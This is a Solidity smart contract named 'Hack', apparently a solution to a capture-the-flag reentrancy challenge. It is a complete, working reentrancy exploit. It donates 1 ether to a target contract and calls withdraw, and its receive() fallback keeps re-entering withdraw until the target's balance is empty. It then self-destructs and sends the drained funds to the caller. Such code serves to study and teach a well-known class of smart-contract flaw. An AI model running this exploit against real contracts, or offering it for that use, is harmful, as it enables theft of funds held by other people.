// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

interface IReentrancy {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract Hack {
    IReentrancy private immutable reentrancyContract;

    constructor(address reentrancyContractAddress) {
        reentrancyContract = IReentrancy(reentrancyContractAddress);
    }

    receive() external payable {
        uint256 amount = min(1e18, address(reentrancyContract).balance);
        if (amount > 0) {
            reentrancyContract.withdraw(amount);
        }
    }

    function attack() external payable {
        reentrancyContract.donate{value: 1e18}(address(this));
        reentrancyContract.withdraw(1e18);

        require(address(reentrancyContract).balance == 0, "Reentrancy contract balance is bigger than zero.");
        selfdestruct(payable(msg.sender));
    }

    function min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }
}